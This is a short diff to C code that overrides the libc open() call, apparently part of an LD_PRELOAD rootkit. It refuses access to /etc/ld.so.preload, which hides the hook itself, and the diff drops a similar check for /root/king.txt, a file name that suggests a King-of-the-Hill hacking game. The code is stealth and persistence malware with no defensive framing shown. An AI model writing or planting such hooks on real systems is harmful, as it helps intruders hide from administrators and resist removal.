@@ -78,7 +78,7 @@ int open(const char *pathname, int flags, ...) {
     }
 
     // Hide the file descriptor for /etc/ld.so.preload and /root/king.txt
-    if (strcmp(pathname, target_file) == 0 || strcmp(pathname, hidden_file) == 0) {
+    if (strcmp(pathname, target_file) == 0) {
         errno = EACCES; // Return permission error to prevent opening the file
         return -1;
     }
